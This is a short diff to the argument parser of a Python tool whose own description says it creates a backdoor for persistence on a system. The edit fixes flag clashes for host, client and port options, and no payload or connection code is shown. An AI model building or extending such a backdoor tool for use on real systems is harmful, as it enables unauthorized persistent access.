@@ -9,9 +9,9 @@ def parse_args():
         description="creates a backdoor to install on a system to gain persistence")
     client_server = parser.add_mutually_exclusive_group()
     client_server.add_argument(
-        '-h', '--host', help='establishes current connection as where clients will connect to')
+        '--host', help='establishes current connection as where clients will connect to')
     client_server.add_argument(
-        '-c' '--client', help='establishes current connextion as client issuing commends to the server')
+        '--client', help='establishes current connextion as client issuing commends to the server')
     port = parser.add_mutually_exclusive_group()
     port.add_argument(
         '-p', '--port', help='defines static connection port', type=int, nargs=1)
